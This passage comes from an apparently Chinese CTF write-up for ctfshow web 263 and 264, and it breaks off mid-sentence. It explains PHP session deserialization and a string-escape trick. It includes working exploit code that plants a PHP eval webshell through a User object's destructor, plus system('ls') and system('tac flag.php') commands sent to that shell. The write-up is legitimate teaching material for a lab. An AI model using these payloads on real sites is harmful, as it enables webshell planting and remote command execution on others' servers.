punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token comment\">// 登陆成功取消次数累计</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"欢迎您\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'UserName0'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token comment\">// 登陆失败累计次数加 1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"登陆失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>inc.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"log-\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"使用\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"登陆\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">status</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"成功\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"失败\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"----\"</span><span class=\"token operator\">.</span><span class=\"token function\">date_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d H:i:s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">...</span></span></pre></td></tr></table></figure><p>可以看到在 inc.php 中，User 的 <code>__destruct</code>  方法有 <code>file_put_contents</code>  方法，那么可以尝试一句话木马写文件，那么必须创建 User 对象</p>\n<p>查看源码流程，由于一开始进入，便会设置 cookie 及 session，故略去 if 为 false 的情况</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">5</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>由于在 index.php 中无 User 类，故这里有用的只有设置 session 值</p>\n<p>故还需到 check.php 中，运行 <code>$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);</code></p>\n<p>故设置好 cookie 的 limit 值后，前后各访问一次 index.php 和 check.php，就能创建木马文件</p>\n<p>这里用到了 <code>PHP的session反序列化漏洞</code> 知识，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt\">参考文章</span></p>\n<h2 id=\"php-session反序列化漏洞\"><a class=\"anchor\" href=\"#php-session反序列化漏洞\">#</a> php session 反序列化漏洞</h2>\n<h3 id=\"phpini-与session有关的配置\"><a class=\"anchor\" href=\"#phpini-与session有关的配置\">#</a> php.ini 与 session 有关的配置</h3>\n<figure class=\"highlight ini\"><figcaption data-lang=\"ini\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key attr-name\">session.save_path</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">\"\"  --设置session的存储路径</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key attr-name\">session.save_handler</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>session.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php</pre></td></tr></table></figure><p>其中 <code>session.serialize_handler</code>  共有三项值，各存储方式如下</p>\n<ul>\n<li>\n<p>php_binary：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</p>\n<p>如： <code>names:6:&quot;spoock&quot;;</code></p>\n</li>\n<li>\n<p>php：键名 + 竖线 + 经过 serialize () 函数序列处理的值</p>\n<p>如： <code>name|s:6:&quot;spoock&quot;;</code></p>\n</li>\n<li>\n<p>php_serialize (php&gt;5.5.4)：经过 serialize () 函数序列化处理的值</p>\n<p>如： <code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code></p>\n</li>\n</ul>\n<p>当在 <code>php</code>  引擎设置下解析 <code>a:1:&#123;s:4:&quot;ryat&quot;;s:30:&quot;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;</code>  时，由于在该设置下会以 <code>|</code>  为界，左边为 key，右边为 value，然后进行反序列化，最后得到</p>\n<p><code>a:1:&#123;s:4:&quot;ryat&quot;;s:30:&quot;</code>  = A 类对象</p>\n<p>从而得到一个 A 类对象</p>\n<p>因此，在这题，可以利用该原理获取一个 User 类对象</p>\n<p>exp.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"a.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[1]);?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><span class=\"red\">注：这里使用 <code>urlencode</code>  主要是为了防止影响结果，在做题时因 <code>+</code>  导致无法出结果</span></p>\n<p>User 对象已经构建，按照前面分析进行操作，生成的木马文件为 <code>log-a.php</code></p>\n<p>访问</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5CWeb-vip%5Cweb263_2.jpg\" alt=\"\" /></p>\n<p>一次 post 以下，得到 flag</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>1&#x3D;system(&#39;ls&#39;);</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>1&#x3D;system(&#39;tac flag.php&#39;);</pre></td></tr></table></figure><h1 id=\"web-264\"><a class=\"anchor\" href=\"#web-264\">#</a> web 264</h1>\n<p>相比较于 web262，此时反序列化对象由 index.php 中的 <code>$_SESSION['msg']</code>  传递，因此不能像 web262 那样解题，而是涉及到字符串逃逸。</p>\n<p>这一题的字符串逃逸比较简单</p>\n<p>首先编写以下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到 <code>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:0:&quot;&quot;;s:3:&quot;msg&quot;;s:0:&quot;&quot;;s:2:&quot;to&quot;;s:0:&quot;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>\n<p>复制 <code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> ，作为构造的结尾</p>\n<p>再编写代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到 <code>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:0:&quot;&quot;;s:3:&quot;msg&quot;;s:0:&quot;&quot;;s:2:&quot;to&quot;;s:27:&quot;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>\n<p>可以看到，构造的结尾共有 27 个字符，而 <code>fuck</code>  替换为 <code>loveU</code>  增加了一个字符，故共需要 27 个 <code>fuck</code></p>\n<p>编写如下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\";s:5:\"token\";s:5:\"admin\";&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fuck\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"loveU\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>得到</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:0:&quot;&quot;;s:3:&quot;msg&quot;;s:0:&quot;&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</pre></td></tr></table></figure><p>经检查， <code>to</code>  替换后 135 的末尾恰为最后一个 <code>loveU</code>  的结尾，故构造正确</p>\n<p>因此 